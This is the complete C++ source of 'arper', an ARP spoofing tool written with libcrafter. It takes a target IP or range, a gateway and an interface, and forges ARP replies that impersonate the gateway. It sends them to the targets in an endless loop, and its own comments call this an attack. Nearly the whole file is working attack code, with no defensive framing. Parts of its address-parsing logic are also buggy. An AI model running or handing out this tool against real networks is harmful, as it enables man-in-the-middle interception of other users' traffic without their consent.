/*
ARPER - 
Copyright [c] 2014, Created by Viet Luu 
[WEB] HTTP://WWW.RING0LAB.COM
-----------------------------------------------------------------------
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <http://www.gnu.org/licenses/>.
*/

/*
Required Libraries
libcrafter
libpcap0.8 and libpcap0.8-dev
boost library
*/

#include <stdio.h>
#include <iostream>
#include <iomanip>
#include <stdbool.h>
#include <stdlib.h>
#include <unistd.h>
#include <crafter.h>
#include <signal.h>
#include <string>
#include <boost/lexical_cast.hpp>
#include <map>
#include <crafter.h>


using namespace std;
using namespace Crafter;

// Function looks up hosts status
map<string,string> pair_addr;

void PrintARPInfo(Packet* sniff_packet, void* user) {
        /* Get the ARP header from the sniffed packet */
        ARP* arp_layer = sniff_packet->GetLayer<ARP>();

        /* Get the Source IP / MAC pair */
        pair_addr[arp_layer->GetSenderIP()] = arp_layer->GetSenderMAC();

}

// Functions Section -------------------------------------------

void PrintARPInfo(Packet* sniff_packet, void* user);
bool isNumValid ( char c );
bool isValid ( char c[] );
void arpEngine (char *target, char *gateway, char *interface);
void helperLite ();
void helperFull ();
int rangeFinder(int firstRange, int lastRange);
bool hostStatus(string targets, char *interface);

char version[] = "1.3.2";
bool dashFlag = false;  // DashFlag, Alerts when dash appeared in target option : For IP range calcuation purposes.

// Main Program -------------------------------------------------

int main (int argc, char *argv[])
{
	/* Variables */
	int c;
	char *target, *gateway, *interface;
	bool tflag = false, gflag = false, iflag = false; // Flag variables to tell if options are selected.
	bool argErr = false;  // Error Flag, argErr must be false for function to be executed.

	// Gets inputs from user

	while ( ( c = getopt(argc, argv, "t:g:i:vh")) != -1 )
	{
		switch (c)
		{	
			case 't':
				tflag = true;
				target = optarg;
				if (isValid(target) == false)
					{
						printf("[!] Invalid Target Address(s) %s\n", target);
						argErr = true;
					}
				break;
			case 'g':
				gflag = true;
				gateway = optarg;
				if (isValid(gateway) == false)
					{
						printf("[!] Invalid Gateway Address %s\n", gateway);	
						argErr = true;
					}			
				break;
			case 'i':
				iflag = true;
				interface = optarg;
				break;
			case 'v':
				argErr = true;
				printf("[!] Version %s\n", version);
				break;
			case 'h':
				helperFull();
				argErr = true;
				break;
			case '?':
				helperLite();
				break;
		}
	}

	if ( argc <= 1 )  // If no option is selected, then helperLite() function will be activated.
	{
		helperLite(); // Help information
		exit(1);
	}
	if ( argErr )
		exit(1);
	if ( !tflag )
	{
		printf("[!] Missing -t option\n"); // -t was mandatory, target host(s)
		exit(1);
	}
	if ( !gflag )
	{
		printf("[!] Missing -g option\n"); // -g was mandatory, gateway host
		exit(1);
	}
	if ( !iflag )
	{
		printf("[!] Missing -i option\n"); // -i was mandatory, interface
		exit(1);
	}



// Launching ARP Engine

	if ( !argErr )
		arpEngine (target, gateway, interface);

	return 0;
}

/* Validates IP address(s) -------------------------------- */

bool isNumValid ( char c )  // validates arguments
{
	if ( ( c >= '0' && c <= '9' ) || ( c == '.' ) || ( c == '-') )
		return true;
	else
		return false;
}

/* Validates IP address(s) -------------------------------- */

bool isValid ( char c[] )  // validates arguments
{
	/* dotc    = counts how many dots are in an IP address
	   nextdot = counts how many dots are next to each other
	   nextnum = counts how many numbers are next to each other
	   total   = the length of (data) 
	   dashCount = counts how many dashes*/

	int dotc = 0, nextdot = 0, nextnum = 0, total = 0, dashCount = 0; // dot counter and total counter
	int max255 = 0; // If over 255 then is invalid
	bool flag; // Set flag to return signal
	bool isNextDot = false; // isNextDot means .. is not valid
	bool Err = false;
	char lastDash;

	// Validates address(s) --------------------------------

	for ( int i = 0; c[i] != '\0'; ++i )
		if ( isNumValid (c[i]) )  // Validates characters, they must be numbers and dots. 
		{
			if ( c[i] == '.' )  
			{		
				if ( !isNextDot )  // Dots must not be next to each other.
				{
					++dotc;  
					isNextDot = true;  // Set signal already counted
				}
				else if ( isNextDot )  // If dot is already counted, then nextdot will be counted
				{
					++nextdot;  // This tells how many dots are next to each other.
				}
				nextnum = 0; // Reset nextnum number to 0 
				max255 = 0; // Reset back to 0;
			}
			else if ( (c[i] != '.') && (c[i] != '-') ) // If next character is not dot
				{
					isNextDot = false;  // Reset dot count
					++nextnum;  // Next to number count
					max255 += atoi(&c[i]);
					if ( max255 >= 318 ) // More than 318 is invalid, example : atoi(256) == 318.  
						Err = true;
				}
				if ( nextnum >= 4 ) 
					Err = true;  // If next number is more than 3 counts, then error
				else if ( c[i] == '-' ) // If character is dash
					{
						dashFlag = true;
						if ( c[i - 1] == '.' ) // If dash next to dot == invalid
							Err = true;
						max255 = 0; // Reset max255
						nextnum = 0; // Reset next number
						++dashCount;  // Finds how many dashes are there
						if ( dotc != 3 ) // If dash is not behind 3 dots, then error
							Err = true;
						else if ( dashCount > 1 ) // If dash is more than 1 dash then it is error
							Err = true;
					}
				else if ( ( dashCount == 1 ) && ( !isdigit(c[i]) ) )
					Err = true;
			++total;
			lastDash = c[i];
		}
		else if ( !isNumValid (c[i]) )  // If alphabet then set to true for Error
			Err = true; 
	// All flags should be within the requirements
	if ( (total >= 7 && total <= 19) && (dotc == 3) && (nextdot == 0) && (Err == false) && (lastDash != '-') )
		flag = true; // Valid IP Address
	else
		flag = false; // Invalid IP Address

	//Debugging purposes ---------- DO NOT DELETE
	//printf("%d, %d, %d, %d, %d, %d, %d\n", flag, dotc, total, nextdot, nextnum, max255, dashCount);
	//printf("%c\n", lastDash);

	return flag;
}


// Main Engine to Activate ARP spoofing attack.

void arpEngine (char *target, char *gateway, char *interface)
{
	int lastRangeNumber = 0, lastrangeCount = 0;   // Last range for target hosts, lastrangeCount is the counter to count character positions after dash.
	int firstRangeNumber = 0, firstrangeCount = 0; // First range for target hosts, firstrangeCount is the counter to count character positions before dash up to dot.
	int dotc = 0; // Dot counter
	int i = 0;
	int totalLength = 0; // Total length till the end of all dots.
	int rangeLength = 0; // Example: 192.168.1.1-10, range should be 10-1 = 9, 
	bool hoststatus = false; // Host status variable

	// If target variable contains dash, then it considers multiple hosts attack

	if ( dashFlag )
	{
		// Multiple systems attack
		for ( i = 0; target[i] != '\0'; ++i ) 
			if ( target[i] == '.' )
			{
				++dotc;
				if (dotc == 3)
					{
						firstRangeNumber = int(target[i+1] - '0'); // Converting character to int
						for ( int k = i; target[k] != '-'; ++k )
							++firstrangeCount;
						firstrangeCount -= 1;
						if (firstrangeCount == 2)
						{
							firstRangeNumber = rangeFinder (firstRangeNumber, int(target[i+2]) - '0');
						}
						if (firstrangeCount == 3)
						{
							firstRangeNumber = rangeFinder (firstRangeNumber, int(target[i+2]) - '0');
							firstRangeNumber = rangeFinder (firstRangeNumber, int(target[i+3]) - '0');
						}
					}
			}
			else if ( target[i] == '-' ) // Startig with dash location
				{
				lastRangeNumber = int(target[i+1] - '0');
				for ( int j = i; target[j] != '\0'; ++j ) // loop until the end of array
					++lastrangeCount;
				lastrangeCount -= 1;
				if (lastrangeCount == 2)
				{
					lastRangeNumber = rangeFinder (lastRangeNumber, int(target[i+2]) - '0');
				}
				if (lastrangeCount == 3)
				{
					lastRangeNumber = rangeFinder (lastRangeNumber, int(target[i+2]) - '0');
					lastRangeNumber = rangeFinder (lastRangeNumber, int(target[i+3]) - '0');
				}

				}
		
		// printf("%d, %d, %d, %d %d\n", firstRangeNumber, lastRangeNumber, lastrangeCount, dotc, firstrangeCount); // for debugging

		if ( firstRangeNumber >= lastRangeNumber )
			printf("[!] Invalid Range Option\n");
		else
		{
			// Valid Range Options
			printf("- [!] Sending Packets...\n");
			dotc = 0;
			for ( int i = 0; target[i] != '\0'; ++i )
			{
				if ( dotc != 3 )
					++totalLength;
				if ( target[i] == '.' )
					++dotc;
			}

			rangeLength = lastRangeNumber - firstRangeNumber + 1;
			string targets[rangeLength];
			// Building range of IP addresses
			for ( int v = 0; v < rangeLength; ++v )
			{
				for ( int z = 0; z < totalLength; ++z )
					targets[v] += target[z]; // Building hosts by looking at the last dot
				targets[v] += boost::lexical_cast<std::string>(firstRangeNumber+v); // adding range of numbers to hosts
				//cout << targets[v] << endl; // for debugging prints hosts
			}

			// printf("%d, %d\n", totalLength, rangeLength); for debugging

			string localIP = GetMyIP(interface); // Set IP Address associated to the interface
			string localMac = GetMyMAC(interface); // Set Mac Address associated to the interface

			string targetMacs[rangeLength];

			// Basic Frames Infomration --------------------------

			Ethernet ether_header[rangeLength];
			ARP arp_header[rangeLength];
			Packet targetPacket[rangeLength];
			string gatewayMac = GetMAC(gateway, interface);

			printf("\n- [!] arper %s copyright [c] 2014 Viet Luu [w] ring0lab.com \n", version);
			cout << setfill('-') << setw(62) << "-" << endl;
			cout << setfill(' ') << setw(14) << "- [!] Local   : " << setw(17) << localIP << setw(25) << localMac << setw(4) << "-" << endl;

			for ( int v = 0; v < rangeLength; ++v )
			{
				//targetMacs[v] = GetMAC(targets[v], interface);
				hoststatus = hostStatus(targets[v], interface);
				if (!hoststatus)  // targetMacs[v].size() == 0
				{
					targetMacs[v] = "[OFFLINE]";
					cout << setw(14) << "- [!] Target  : " << setw(17) << targets[v] <<  setw(25) << targetMacs[v] << setw(4) << "-" << endl;
					ether_header[v].SetSourceMAC(localMac);
					arp_header[v].SetOperation(ARP::Reply);
					ether_header[v].SetDestinationMAC(targetMacs[v]); 
					arp_header[v].SetSenderIP(gateway);
					arp_header[v].SetSenderMAC(localMac);
					arp_header[v].SetTargetIP(targets[v]);
					targetPacket[v].PushLayer(ether_header[v]);
					targetPacket[v].PushLayer(arp_header[v]);
				}
				if (hoststatus)
				{
					targetMacs[v] = GetMAC(targets[v], interface);
					ether_header[v].SetSourceMAC(localMac);
					arp_header[v].SetOperation(ARP::Reply);
					ether_header[v].SetDestinationMAC(targetMacs[v]); 
					arp_header[v].SetSenderIP(gateway);
					arp_header[v].SetSenderMAC(localMac);
					arp_header[v].SetTargetIP(targets[v]);
					targetPacket[v].PushLayer(ether_header[v]);
					targetPacket[v].PushLayer(arp_header[v]);
					cout << setw(14) << "- [!] Target  : " << setw(17) << targets[v] <<  setw(25) << targetMacs[v] << setw(4) << "-" << endl;
				}
			}
			if (gatewayMac.size() == 0)
				gatewayMac = "[OFFLINE]";
			cout << setw(14) << "- [!] Gateway : " << setw(17) << gateway << setw(25) << gatewayMac << setw(4) << "-" << endl;
			cout << setfill('-') << setw(62) << "-" << endl;


			// send packets
			while (true)
			{
				for ( int v = 0; v < rangeLength; ++v )
				{
					targetPacket[v].Send(interface);
					sleep(3);
				}
			}

		}
	}
	else
	{
		// Single target host ----------------------

		string localIP = GetMyIP(interface); // Set IP Address associated to the interface
		string localMac = GetMyMAC(interface); // Set Mac Address associated to the interface

		string targetMac = GetMAC(target, interface); // Send an ARP Request to obtain target MAC Address
		string gatewayMac = GetMAC(gateway, interface); // Send an ARP Request to obtain Gateway MAC Address

		/* General Headers DATA */

		Ethernet ether_header;
		ether_header.SetSourceMAC(localMac); // Set Local MAC Address to source MAC
		ARP arp_header;
		arp_header.SetOperation(ARP::Reply);

		Packet targetPacket; // Create Packet for target
		ether_header.SetDestinationMAC(targetMac); // Set Target MAC Address to destination MAC

		// ARP Headers
		arp_header.SetSenderIP(gateway); // Spoof IP Addresss of Gateway
		arp_header.SetSenderMAC(localMac);
		arp_header.SetTargetIP(target);

		// Combine both headers for Target
		targetPacket.PushLayer(ether_header);
		targetPacket.PushLayer(arp_header);

		// Check hosts alive

		if (targetMac.size() == 0)
			targetMac = "[OFFLINE]";
		if (gatewayMac.size() == 0)
			gatewayMac = "[OFFLINE]";

		printf("\n- [!] arper %s copyright [c] 2014 Viet Luu [w] ring0lab.com \n", version);
		cout << setfill('-') << setw(62) << "-" << endl;
		cout << setfill(' ') << setw(14) << "- [!] Local   : " << setw(17) << localIP << setw(25) << localMac << setw(4) << "-" << endl;
		cout << setw(14) << "- [!] Target  : " << setw(17) << target <<  setw(25) << targetMac << setw(4) << "-" << endl;
		cout << setw(14) << "- [!] Gateway : " << setw(17) << gateway << setw(25) << gatewayMac << setw(4) << "-" << endl;
		cout << setfill('-') << setw(62) << "-" << endl;

		while(true)
		{
			targetPacket.Send(interface);
			sleep(3);
		}
		
	}


}

// This converts array of numbers into integer number, Example: [1][2][3] = 123

int rangeFinder(int firstRange, int lastRange)
{
	int times = 1;
	if ( times <= lastRange )
	{
		times *= 10;
		return firstRange*times + lastRange;
	}
	else if ( times >= lastRange)
	{
		return firstRange*10;
	}
}

// Function to check for hosts status -----------------------

bool hostStatus(string targets, char *interface)
{

 	string iface = interface;
    string MyIP = GetMyIP(iface);
    string MyMAC = GetMyMAC(iface);


    /* --------- Common data to all headers --------- */

    Ethernet ether_header;
    ether_header.SetSourceMAC(MyMAC);
    ether_header.SetDestinationMAC("ff:ff:ff:ff:ff:ff");   
    ARP arp_header;
    arp_header.SetOperation(ARP::Request);               
    arp_header.SetSenderIP(MyIP);                         
    arp_header.SetSenderMAC(MyMAC);

    /* ---------------------------------------------- */

    string target = targets;      
    arp_header.SetTargetIP(target);                 
    Packet packet;
    packet.PushLayer(ether_header);
    packet.PushLayer(arp_header);
    Sniffer sniff("arp[7]=2",iface,PrintARPInfo);  
    sniff.Spawn(-1);
   	packet.Send(iface);
    sleep(1);
    sniff.Cancel();

    if (pair_addr.size() == 0)
    	return false;
    else
    	return true;

}

// ------------ Small Help Function

void helperLite ()
{
	printf("\n[!] arper %s copyright [c] 2014 Viet Luu [w] ring0lab.com \n[!] Usage: -t target -g gateway -i interface [-h MORE HELP]\n\n", version);
}

// ------------ Full Help Function, for better descriptions.

void helperFull ()
{
	printf("\n[!] arper %s copyright [c] 2014 Viet Luu [w] ring0lab.com \n[!] Usage: -t target -g gateway -i interface\n\n", version);
	printf("General Options:\n");
	printf("   -t           set target address(s), ex: 192.168.1.2\n");
	printf("                                           192.168.1.2-10\n");
	printf("   -g           set gateway address\n");
	printf("   -i           set network interface, ex: eth, wlan\n");
	printf("\nInfo Options:\n");
	printf("   -v           prints version\n");
	printf("   -h           prints this page\n");
}